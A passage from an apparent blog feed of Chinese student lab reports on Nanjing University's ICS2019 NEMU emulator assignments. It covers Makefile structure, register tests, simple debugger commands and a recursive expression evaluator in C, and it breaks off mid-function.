data-target="#collapse-40l8d6lluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-40l8d6lluwpkzu"><pre><code class="hljs makefile">OBJ_DIR ?= <span class="hljs-variable">$(BUILD_DIR)</span>/obj-<span class="hljs-variable">$(ISA)</span><span class="hljs-variable">$(SO)</span>BINARY ?= <span class="hljs-variable">$(BUILD_DIR)</span>/<span class="hljs-variable">$(ISA)</span>-<span class="hljs-variable">$(NAME)</span><span class="hljs-variable">$(SO)</span></code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211049486409_502_20230523230818475318_173_image-20230418215016739.png" alt="image-20230418215016739"><figcaption aria-hidden="true">image-20230418215016739</figcaption></figure><p>关于SRC:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-apn67tlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-apn67tlluwpkzu"><pre><code class="hljs makefile">SRCS = <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> find src/ -name "*.c" | grep -v "isa")</span>SRCS += <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> find src/isa/<span class="hljs-variable">$(ISA)</span> -name "*.c")</span></code></pre></div></div><p>-v表示不匹配“isa"，先把isa文件夹排除掉，再根据选择的指令集去isa文件夹里面找。SRC包括构建NEMU用到的所有.c文件。</p><p>build 的各.o 文件依赖于 src 文件夹下的所有.c 文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0xgmdnlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-0xgmdnlluwpkzu"><pre><code class="hljs makefile"><span class="hljs-variable">$(OBJ_DIR)</span>/%.o: src/%.c@echo + CC <span class="hljs-variable">$&lt;</span>@mkdir -p <span class="hljs-variable">$(<span class="hljs-built_in">dir</span> <span class="hljs-variable">$@</span>)</span>@<span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(CFLAGS)</span> <span class="hljs-variable">$(SO_CFLAGS)</span> -c -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$&lt;</span></code></pre></div></div><p>各.c 文件依赖于其中定义的.h 文件（隐含规则）</p><p>依赖关系终于分析完了。下面看到底执行了哪些操作。</p><p><code>$(BINARY)</code>生成第一步，通知tracer去gitcommit一下，commit信息是“compile”。这个函数是在Makefile.git里的，前面通过include引入。</p><p>第二步只是打印一下我现在要链接生成目标了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211050452384_863_20230523230824465256_348_image-20230418221720529.png" alt="image-20230418221720529"><figcaption aria-hidden="true">image-20230418221720529</figcaption></figure><p>最后一行便是生成NEMU的临门一脚。</p><p>顺便说一下执行make run 的过程。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c4yd4qlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-c4yd4qlluwpkzu"><pre><code class="hljs makefile">NEMU_EXEC := <span class="hljs-variable">$(BINARY)</span> <span class="hljs-variable">$(ARGS)</span> <span class="hljs-variable">$(IMG)</span></code></pre></div></div><p>定义参数:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lpfy7rlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-lpfy7rlluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">override</span> ARGS ?= -l $(BUILD_DIR)/nemu-log.txt<span class="hljs-keyword">override</span> ARGS += -d $(QEMU_SO)</code></pre></div></div><p>override的意思是不允许通过命令行指定的方式替代在Makefile中的变量定义。</p><p>执行出来就是这一句。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211052523101_993_20230523230831361885_388_image-20230418221942591.png" alt="image-20230418221942591"><figcaption aria-hidden="true">image-20230418221942591</figcaption></figure><h3 id="课后题">课后题</h3><p>1.指令使用条件问题</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211053630092_596_20230523230835450240_415_image-20230418163951487.png" alt="image-20230418163951487"><figcaption aria-hidden="true">image-20230418163951487</figcaption></figure><p>为什么用jbe而不是jle？</p><p>jbe用于比较无符号数，jle用于比较有符号数。在 x86中，内存地址被视为无符号整数，所以要用jbe。</p><p>至于为什么源代码里是大于，却用了小于等于，从各种角度看好像两种用法是等价的，不是很清楚CPU为什么要做这种转换。</p><p>下面是用jbe</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-61flt4lluwpkzu"></i><span>c++</span><div class="collapse show" id="collapse-61flt4lluwpkzu"><pre><code class="hljs c++">get_cont:  movl <span class="hljs-number">8</span>(%ebp), %eax   movl <span class="hljs-number">12</span>(%ebp), %edx   cmpl %eax, %edx  ja .<span class="hljs-function">L1</span><span class="hljs-function">  <span class="hljs-title">movl</span> <span class="hljs-params">(%eax)</span>, %eax</span><span class="hljs-function">  jmp .L2</span><span class="hljs-function">.L1:</span><span class="hljs-function">  movl (%edx), %eax</span><span class="hljs-function">.L2:</span></code></pre></div></div><p>2.nemu输出的helloworld和程序中输出的helloworld有什么区别</p><p>指导书在输入输出部分给出了这个问题的答案:</p><p>nemu的helloworld程序是可以说是直接运行在裸机上，可以在AM的抽象下直接输出到设备(串口)；而我们在程序设计课上写的helloworld程序位于操作系统之上，不能直接操作设备，只能通过操作系统提供的服务进行输出，输出的数据要经过很多层抽象才能到达设备层。这个问题问的和<code>为什么要有AM？</code>这个问题很类似。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南京大学ics2019_PA1</title>
    <link href="/posts/4251/"/>
    <url>/posts/4251/</url>
    
    <content type="html"><![CDATA[<h1 id="pa1实验报告">PA1实验报告</h1><p>田佳业 2013599</p><p>为了方便VSCode远程连接，采用64位Ubuntu系统完成ics2019对应的PA。因此报告中一部分代码可能会与2018版本不一致。</p><h2 id="pa1.1">PA1.1</h2><p>任务：实现单步执行, 打印寄存器状态, 扫描内存</p><h3 id="开天辟地的篇章">开天辟地的篇章</h3><h4 id="任务">任务</h4><p>这一部分介绍了“最简单的计算机”应当具有哪些特征和功能。</p><h4 id="思考题">思考题</h4><h6 id="计算机可以没有寄存器吗">计算机可以没有寄存器吗？</h6><blockquote><p>存储层次的产生是顺应规律的，我们会自然的把经常访问的数据放在更快的，离CPU更近(更容易获取)的存储介质上。假设计算机“不得不”没有寄存器,我们也会让内存充当”寄存器“的作用(相比磁盘等更慢的介质)，只不过这样会使得性能变差,因为一些需要经常使用的数据也不得不放在内存当中.</p></blockquote><h6 id="计算机的状态模型与图灵机的关系">计算机的状态模型与图灵机的关系？</h6><p>对于TRM来说, 是不是也有这样状态的概念呢? 具体地,什么东西表征了TRM的状态? 在状态模型中, 执行指令和执行程序,其本质分别是什么?</p><blockquote><p>图灵机中“状态”的概念在PA中体现在<code>NEMUState</code>这个结构中。包括<code>{ NEMU_STOP, NEMU_RUNNING, NEMU_END, NEMU_ABORT }</code>，图灵机中”格局“的概念(包括带描述，当前状态和读写头)对应到计算机就像”快照“，分别对应存储器中内容，计算机运行状态和程序计数器。图灵机中输入和转移函数都从”纸带“中获取，就像冯诺依曼体系结构，执行指令和执行程序本质上没有什么区别。</p></blockquote><h3 id="rtfsc">RTFSC</h3><h4 id="任务-1">任务</h4><h5 id="实现x86的寄存器结构体">实现x86的寄存器结构体</h5><p>这一部分讲义中有答案，在此不再列出代码。匿名union可以在共享内存的同时，还能以union内的名称在外部访问。这也适应了PA中”寄存器别名“的需求。</p><h6 id="reg_test0是如何测试你的实现的">reg_test0是如何测试你的实现的？</h6><blockquote><p>代码中的<code>assert()</code>条件是根据什么写出来的:产生随机值到<code>sample</code>数组，让<code>cpu</code>获取，检查是否cpu能够正确获取这些值。ps:通过与1与可以取低位。</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x5ypb6lluxp18z"></i><span>c</span><div class="collapse show" id="collapse-x5ypb6lluxp18z"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">reg_test</span><span class="hljs-params">()</span> {  <span class="hljs-comment">//init random seed</span>  srand(time(<span class="hljs-number">0</span>));  <span class="hljs-type">uint32_t</span> sample[<span class="hljs-number">8</span>];  <span class="hljs-comment">//generate random values for eip</span>  <span class="hljs-type">uint32_t</span> eip_sample = rand();  cpu.eip = eip_sample;  <span class="hljs-type">int</span> i;  <span class="hljs-comment">//generate random values for general registers</span>  <span class="hljs-keyword">for</span> (i = R_EAX; i &lt;= R_EDI; i ++) {    sample[i] = rand();    reg_l(i) = sample[i];    <span class="hljs-comment">// test whether reg_w() can normally return the low 16 bits of the general register</span>    assert(reg_w(i) == (sample[i] &amp; <span class="hljs-number">0xffff</span>));  }    <span class="hljs-comment">// test whether reg_w() can normally return the low 8 bits of the general register</span>  assert(reg_b(R_AL) == (sample[R_EAX] &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_AH) == ((sample[R_EAX] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_BL) == (sample[R_EBX] &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_BH) == ((sample[R_EBX] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_CL) == (sample[R_ECX] &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_CH) == ((sample[R_ECX] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_DL) == (sample[R_EDX] &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_DH) == ((sample[R_EDX] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>));  <span class="hljs-comment">// test the alias of general registers</span>  assert(sample[R_EAX] == cpu.eax);  assert(sample[R_ECX] == cpu.ecx);  assert(sample[R_EDX] == cpu.edx);  assert(sample[R_EBX] == cpu.ebx);  assert(sample[R_ESP] == cpu.esp);  assert(sample[R_EBP] == cpu.ebp);  assert(sample[R_ESI] == cpu.esi);  assert(sample[R_EDI] == cpu.edi);  assert(eip_sample == cpu.eip);}</code></pre></div></div><h6 id="究竟要执行多久">究竟要执行多久？</h6><p>在<code>cmd_c()</code>函数中,调用<code>cpu_exec()</code>的时候传入了参数<code>-1</code>的含义？</p><blockquote><p><code>-1</code>的十六进制表示就是<code>0xffffffff</code>,然后这是一个无符号的类型, 所以是最大的无符号数,所以在正常情况下(<code>nemu_state.state == NEMU_RUNNING</code>)会一直执行下去。在for循环内，2018版的PA为<code>exec_wrapper</code>，2019PA为<code>exec_once</code>就做了图灵机章节中所述三件基本事情：取指，执行，更新PC。</p></blockquote><h6 id="潜在的威胁">潜在的威胁</h6><p>"调用<code>cpu_exec()</code>的时候传入了参数<code>-1</code>",这一做法属于未定义行为吗? 请查阅C99手册确认你的想法.</p><blockquote><p>C99的文档并不太好找，但猜测既然这么问，很可能是属于未定义行为。</p></blockquote><h6 id="温故而知新">温故而知新</h6><p><code>opcode_table</code>到底是个什么类型的数组?</p><blockquote><p><code>OpcodeEntry</code>类型。定义如下：</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dylswslluxp18z"></i><span>c++</span><div class="collapse show" id="collapse-dylswslluxp18z"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> {  DHelper decode;  EHelper execute;  <span class="hljs-type">int</span> width;} OpcodeEntry;</code></pre></div></div><h6 id="有始有终">有始有终</h6><p>对于GNU/Linux上的一个程序, 怎么样才算开始? 怎么样才算是结束?对于在NEMU中运行的程序, 问题的答案又是什么呢?</p><blockquote><p>NEMU中为什么要有<code>nemu_trap</code>? 为什么要有monitor?</p><p>在GNU/Linux上的一个C程序，main函数只是充当一个”入口“的作用，在main函数调用之前，为了保证程序可以顺利进行，要先初始化进程执行环境，如堆分配初始化、线程子系统等，如果是C++，C++的全局对象构造函数也是这一时期被执行的，全局析构函数是main之后执行的。</p><p>Linux一般程序的入口是__start函数，有两个段：</p><ul><li>.init段：进程的初始化代码，一个程序开始运行时，在main函数调用之前，会先运行.init段中的代码。</li><li>.fini段：进程终止代码，当main函数正常退出后，glibc会安排执行该段代码。</li></ul><p>在NEMU中<code>nemu_trap</code>指令,就是让程序来结束运行的。定义一个结束程序的API,比如<code>void halt()</code>,它对不同架构上程序的不同结束方式进行了抽象:程序只要调用<code>halt()</code>就可以结束运行。</p></blockquote><h3 id="基础设施">基础设施</h3><h4 id="任务-2">任务</h4><p>这一部分主要是需要实现一个简易调试器，在<code>nemu/src/monitor/debug/ui.c</code>中仿照给出的命令可以比较容易的完成，并没有遇到比较大的困难。</p><h5 id="单步执行">单步执行</h5><p>如果给出参数，执行指定步数，没有，执行一步。读取<code>si</code>后面的数字可以用<code>*args</code>参数，当然根据文档提示也可以用<code>strtok</code>。下面两种实现方式都是可以的。注意用<code>strtok</code>时由于在<code>ui_mainloop</code>中已经传入的<code>str</code>，根据<code>strtok</code>是使用方式后续第一和参数应当使用<code>NULL</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-e5tuezlluxp18z"></i><span>c++</span><div class="collapse show" id="collapse-e5tuezlluxp18z"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">cmd_si</span><span class="hljs-params">(<span class="hljs-type">char</span> *args)</span> </span>{  <span class="hljs-type">int</span> step = <span class="hljs-number">1</span>;  <span class="hljs-keyword">if</span> (args != <span class="hljs-literal">NULL</span>) {    <span class="hljs-built_in">sscanf</span>(args, <span class="hljs-string">"%d"</span>, &amp;step);  }  <span class="hljs-built_in">cpu_exec</span>(step);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-sdksmolluxp18z"></i><span>c++</span><div class="collapse show" id="collapse-sdksmolluxp18z"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">cmd_si</span><span class="hljs-params">(<span class="hljs-type">char</span> *args)</span></span>{  <span class="hljs-type">char</span> * step_c= <span class="hljs-built_in">strtok</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">" "</span>);  <span class="hljs-keyword">if</span>(step_c == <span class="hljs-literal">NULL</span>){    <span class="hljs-built_in">cpu_exec</span>(<span class="hljs-number">1</span>);  }  <span class="hljs-keyword">else</span>{    <span class="hljs-type">int</span> step = <span class="hljs-built_in">atoi</span>(step_c);    <span class="hljs-built_in">cpu_exec</span>(step);  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205843099038_654_20230322090859031854_838_image-20230321183104988.png" alt="image-20230321183104988"><figcaption aria-hidden="true">image-20230321183104988</figcaption></figure><h5 id="打印寄存器">打印寄存器</h5><p>201版本的PA针对不同体系结构的寄存器读取做了抽象，因此在<code>cmd_info</code>中调用<code>isa_reg_display</code>，具体工作在这个函数中进行。</p><p>对于x86实现如下，仿照了gdb的格式，输出寄存器，二进制和十进制值。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8si5yjlluxp18z"></i><span>c++</span><div class="collapse show" id="collapse-8si5yjlluxp18z"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">isa_reg_display</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// it works like the gdb command "info reg"</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = R_EAX; i &lt;= R_EDI; i++)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"$%s\t0x%08x\t%d\n"</span>, regsl[i], <span class="hljs-built_in">reg_l</span>(i), <span class="hljs-built_in">reg_l</span>(i));  }  <span class="hljs-comment">//print pc</span>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"$eip\t0x%08x\n"</span>, cpu.pc);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205844107732_739_20230322090859916082_681_image-20230321183847648.png" alt="image-20230321183847648"><figcaption aria-hidden="true">image-20230321183847648</figcaption></figure><h4 id="实现扫描内存">实现扫描内存</h4><p>这一部分也比较容易，使用用<code>sscanf</code>读取参数，并调用<code>isa_vaddr_read</code>进行读取即可。代码不再赘述。</p><h4 id="问题">问题</h4><h6 id="基础设施-提高项目开发的效率">基础设施-提高项目开发的效率</h6><p>现在我们来假设我们没有提供一键编译的功能,你需要通过手动键入 gcc命令的方式来编译源文件:假 设你手动输入一条 gcc 命令需要 10秒的时间(你还需要输入很多编译选项,能用 10 秒输入完已经是非常快的了), 而NEMU 工程下有 30 个源文件,为了编译出 NEMU的可执行文件,你需要花费多少时间?然而你还需要在开发 NEMU的过程中不断进行编译,假设你需要编译 500 次 NEMU 才能完成PA,一学期下来,你仅仅花在键入编译命令上的时间有多少?</p><p>需要15000s的时间。因此虽然make的语法显得非常晦涩，但和其他GNU工具链一样，当充分熟悉之后可以极大提高开发效率。</p><h6 id="如何测试字符串处理函数">如何测试字符串处理函数？</h6><p>你可以考虑一下, 你会如何测试自己编写的字符串处理函数?</p><blockquote><p>可以像表达式求值一样的思路。如果有已知的库函数能够解决问题，可以通过编写测试用例对照测试。如果没有，可以尝试使用不同的方式实现，进行对照。但这会受到已有思路的限制。当然，最基础的断言，打断点等调试手段也会有帮助，</p></blockquote><h6 id="好像有点不对劲">好像有点不对劲</h6><p>和默认镜像进行对比的时候, 扫描内存的结果貌似有点不太一样.你知道这是为什么吗?</p><blockquote><p>2019版的这个问题，现在还不是很明白，不过猜测与内存地址转换有关系。</p></blockquote><h2 id="pa1.2">PA1.2</h2><h3 id="表达式求值">表达式求值</h3><h4 id="任务-3">任务</h4><p>完成表达式求值的功能。在编译原理的词法分析部分已经有所基础，但在实际编码的过程中尽管也查阅的网上很多资料，写起来也并不太顺手，也是整个实验中耗时最长的一部分。不过有前人的铺垫结合自己的的理解，测试的过程总体还算顺利，所幸没有遇到太奇怪的bug。</p><h5 id="测试程序">测试程序</h5><p>在写这一周目部分代码之前先做的是测试部分(==后面发现2018的PA并没有要求实现这一部分(捂脸))。测试部分如文档所述非常巧妙，生成随机的数字和操作符，然后写了一个模版c程序把表达式通过<code>sprintf</code>”嵌入“到代码中最后使用系统命令编译运行这个C程序。这一部分可以详见<code>nemu/tools/gen-expr/gen-expr.c</code>部分。不过递归的实现还有些小问题，比如连续生成数字或运算结果过大导致结果溢出int范围等。最后还是从里面找了一些正常的表达式手动输入进行测试的。</p><h5 id="添加正则">添加正则</h5><p>编译原理课这一块已经很熟悉了。其中寄存器可以采用宽松验证和准确验证。对于debugger来说准确验证更好，还是尽量避免未知行为的发生。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ir3cowlluxp18z"></i><span>c++</span><div class="collapse show" id="collapse-ir3cowlluxp18z"><pre><code class="hljs c++"><span class="hljs-comment">// {"\\$[a-zA-Z]+",TK_REG}, //register</span><span class="hljs-comment">// more specific</span>{<span class="hljs-string">"\\$(e[abcd]x|e[sbi]p|e[ds]i|[abcd]x|[sb]p|[ds]i)"</span>, TK_REG}};</code></pre></div></div><h5 id="make_token">make_token</h5><p>添加完规则后，框架中已经给出了<code>match</code>的过程，我们只需要把匹配到的<code>token</code>信息保存下来即可。</p><h5 id="预处理">预处理</h5><p>在进入求值部分之前，为了区分负数和减号以及解引用和乘号，按照讲义的思路先过一遍预处理。一个坑是判断是数字的时候不要忘了有十六进制数的存在。这个小问题是写<code>eval</code>函数处理十六进制数的时候想起来的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-n32i0tlluxp18z"></i><span>c++</span><div class="collapse show" id="collapse-n32i0tlluxp18z"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">expr</span><span class="hljs-params">(<span class="hljs-type">char</span> *e, <span class="hljs-type">bool</span> *success)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">make_token</span>(e))  {    *success = <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  }  <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Insert codes to evaluate the expression. */</span>  <span class="hljs-comment">// handle the deref and neg at the first</span>  <span class="hljs-comment">// because if the * or - is at the first, it must be unary operator</span>  <span class="hljs-comment">// pre-processing</span>  <span class="hljs-keyword">if</span> (tokens[<span class="hljs-number">0</span>].type == <span class="hljs-string">'-'</span>)  {    tokens[<span class="hljs-number">0</span>].type = TK_DEREF;  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tokens[<span class="hljs-number">0</span>].type == <span class="hljs-string">'*'</span>)  {    tokens[<span class="hljs-number">0</span>].type = TK_DEREF;  }  <span class="hljs-comment">// parse the rest tokens</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; nr_token; i++)  {    <span class="hljs-keyword">if</span> (tokens[i].type == <span class="hljs-string">'-'</span>)    {      <span class="hljs-keyword">if</span> (tokens[i - <span class="hljs-number">1</span>].type != TK_NUM &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != TK_HEXNUM &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != TK_REG &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != <span class="hljs-string">')'</span>)      {        tokens[i].type = TK_NEG;      }    }    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tokens[i].type == <span class="hljs-string">'*'</span>)    {      <span class="hljs-keyword">if</span> (tokens[i - <span class="hljs-number">1</span>].type != TK_NUM &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != TK_HEXNUM &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != TK_REG &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != <span class="hljs-string">')'</span>)      {        tokens[i].type = TK_DEREF;      }    }  }  *success = <span class="hljs-literal">true</span>;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(<span class="hljs-number">0</span>, nr_token - <span class="hljs-number">1</span>);  <span class="hljs-comment">// return 0;</span>}</code></pre></div></div><h5 id="eval递归求值">eval递归求值</h5><p>这一部分是这个任务的核心，讲义中也给出了实现的思路。我的实现代码如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ji7qkxlluxp18z"></i><span>c++</span><div class="collapse show" id="collapse-ji7qkxlluxp18z"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-type">int</span> q)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">if</span> (p &gt; q)  {    <span class="hljs-comment">/* Bad expression */</span>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">"Bad expression"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p == q)  {    <span class="hljs-keyword">switch</span> (tokens[p].type)    {    <span class="hljs-keyword">case</span> TK_NUM:      <span class="hljs-keyword">return</span> <span class="hljs-built_in">atoi</span>(tokens[p].str);    <span class="hljs-keyword">case</span> TK_HEXNUM:      <span class="hljs-keyword">return</span> <span class="hljs-built_in">strtol</span>(tokens[p].str, <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);    <span class="hljs-keyword">case</span> TK_REG:;      <span class="hljs-comment">// remove the $ in the string</span>      <span class="hljs-type">char</span> *reg_name = tokens[p].str + <span class="hljs-number">1</span>;      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = R_EAX; i &lt; R_EDI; i++)      {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(reg_name, m_regsl[i]) == <span class="hljs-number">0</span>)        {          <span class="hljs-keyword">return</span> <span class="hljs-built_in">reg_l</span>(i);        }        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(reg_name, m_regsw[i]) == <span class="hljs-number">0</span>)        {          <span class="hljs-keyword">return</span> <span class="hljs-built_in">reg_w</span>(i);        }        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(reg_name, m_regsb[i]) == <span class="hljs-number">0</span>)        {          <span class="hljs-keyword">return</span> <span class="hljs-built_in">reg_b</span>(i);        }      }      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(tokens[p].str, <span class="hljs-string">"$eip"</span>) == <span class="hljs-number">0</span>)      {        <span class="hljs-keyword">return</span> cpu.pc;      }      <span class="hljs-keyword">else</span>      {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"error in TK_REG in eval()\n"</span>);        <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);      }    }  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">check_parentheses</span>(p, q) == <span class="hljs-literal">true</span>)  {    <span class="hljs-comment">/* The expression is surrounded by a matched pair of parentheses.</span><span class="hljs-comment">     * If that is the case, just throw away the parentheses.</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(p + <span class="hljs-number">1</span>, q - <span class="hljs-number">1</span>);  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-type">int</span> op_pos = <span class="hljs-built_in">get_domin_op_pos</span>(p, q);    <span class="hljs-comment">// printf("op_pos=%d\n", op_pos);</span>    <span class="hljs-type">uint32_t</span> val2 = <span class="hljs-built_in">eval</span>(op_pos + <span class="hljs-number">1</span>, q);    <span class="hljs-comment">// printf("p=%d\n", p);</span>    <span class="hljs-keyword">if</span> (op_pos == p)    {      <span class="hljs-keyword">switch</span> (tokens[op_pos].type)      {      <span class="hljs-keyword">case</span> TK_DEREF:        <span class="hljs-keyword">return</span> <span class="hljs-built_in">vaddr_read</span>(val2, <span class="hljs-number">4</span>);      <span class="hljs-keyword">case</span> TK_NEG:        <span class="hljs-keyword">return</span> -val2;      <span class="hljs-keyword">case</span> TK_NOT:        <span class="hljs-keyword">return</span> !val2;      <span class="hljs-keyword">default</span>:        <span class="hljs-built_in">panic</span>(<span class="hljs-string">"unrecognized single operator in eval()"</span>);      }    }    <span class="hljs-type">uint32_t</span> val1 = <span class="hljs-built_in">eval</span>(p, op_pos - <span class="hljs-number">1</span>);    <span class="hljs-keyword">switch</span> (tokens[op_pos].type)    {    <span class="hljs-keyword">case</span> <span class="hljs-string">'+'</span>:      <span class="hljs-keyword">return</span> val1 + val2;    <span class="hljs-keyword">case</span> <span class="hljs-string">'-'</span>:      <span class="hljs-keyword">return</span> val1 - val2;    <span class="hljs-keyword">case</span> <span class="hljs-string">'*'</span>:      <span class="hljs-keyword">return</span> val1 * val2;    <span class="hljs-keyword">case</span> <span class="hljs-string">'/'</span>:      <span class="hljs-keyword">return</span> val1 / val2;    <span class="hljs-keyword">case</span> TK_AND:      <span class="hljs-keyword">return</span> val1 &amp;&amp; val2;    <span class="hljs-keyword">case</span> TK_OR:      <span class="hljs-keyword">return</span> val1 || val2;    <span class="hljs-keyword">case</span> TK_EQ:      <span class="hljs-keyword">return</span> val1 == val2;    <span class="hljs-keyword">case</span> TK_NEQ:      <span class="hljs-keyword">return</span> val1 != val2;    <span class="hljs-keyword">default</span>:      <span class="hljs-built_in">panic</span>(<span class="hljs-string">"unrecognized operator in eval()"</span>);    }  }  <span class="hljs-comment">// should not reach here, but if not return, gcc will complain</span>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}</code></pre></div></div><p>最后求值的时候，<code>if (op_pos == p)</code>条件可以使单目运算优先被处理，这一点也是参照了网上的代码才想到。</p><p>其中<code>check_parentheses(p, q)</code>部分的实现不复杂，扫一遍就可以了。先判断左右两端是否被括号包围，再判断里面的括号是否匹配。这一部分代码较简单，不再赘述。</p><p>获取优先级部分比较复杂，又回到了被编译原理支配的痛苦。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-q4v6t4lluxp18z"></i><span>c++</span><div class="collapse show" id="collapse-q4v6t4lluxp18z"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_domin_op_pos</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-type">int</span> q)</span></span><span class="hljs-function"></span>{  <span class="hljs-type">int</span> bracket_cnt = <span class="hljs-number">0</span>;  <span class="hljs-comment">// level 0: * - !</span>  <span class="hljs-comment">// level 1: * /</span>  <span class="hljs-comment">// level 2: + 